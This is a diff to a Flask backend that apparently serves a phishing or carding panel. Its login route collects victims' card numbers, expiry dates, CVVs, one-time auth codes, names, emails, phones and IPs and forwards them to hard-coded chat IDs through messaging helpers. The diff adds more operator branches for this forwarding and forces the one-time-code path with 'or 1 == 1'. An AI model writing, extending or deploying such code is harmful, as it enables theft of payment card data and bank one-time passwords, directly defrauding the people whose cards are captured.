@@ -1,6 +1,6 @@
 from flask import Flask, redirect, request, jsonify
 from flask_cors import CORS
-from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol, cheltut, send_me, send_me1, send_sms1, get_country_by_ip
+from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol, cheltut, send_me, send_me1, send_sms1, cheltut1
 from CHAT_ID import *
 from checker import get_button_by_id
 import parserBIN
@@ -30,8 +30,8 @@ def chel():
     ip_address = request.args.get('ip')
     name = request.args.get('name')
     if ip_address:
+        cheltut1(ip_address, name)
         cheltut(ip_address, name)
-        
         return jsonify({"message": "IP address received", "ip": ip_address})
     else:
         return jsonify({"error": "No IP address provided"}), 400
@@ -58,7 +58,7 @@ def login():
         ID = f'{session}'
 
         if check_ip_in_file(ip_address, 'ips.txt'):
-            if id == '10000001':
+            if id == '10000001' or 1 == 1:
                 if authCode is not None and authCode != 'None':
                     send_sms1(card_number, authCode, ID, ip_address)
                     return '', 200  # Возвращаем пустой ответ с кодом 200
@@ -268,7 +268,25 @@ def login():
             ne_pizdabol(card_number)
             send_buttons_message(salt, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
-    
+
+        elif id == '10000024':
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
+            if authCode is not None and authCode != 'None':
+                send_sms(trefik_tmok, card_number, expiry_date, cvv, authCode, ID, ip_address)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            ne_pizdabol(card_number)
+            send_buttons_message(trefik_tmok, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
+        
+        elif id == '10000025':
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
+            if authCode is not None and authCode != 'None':
+                send_sms(s2000otp, card_number, expiry_date, cvv, authCode, ID, ip_address)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            ne_pizdabol(card_number)
+            send_buttons_message(s2000otp, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
+        
         return '', 200  # Добавляем общий возврат для случаев, когда нет условий или ошибки
 
     
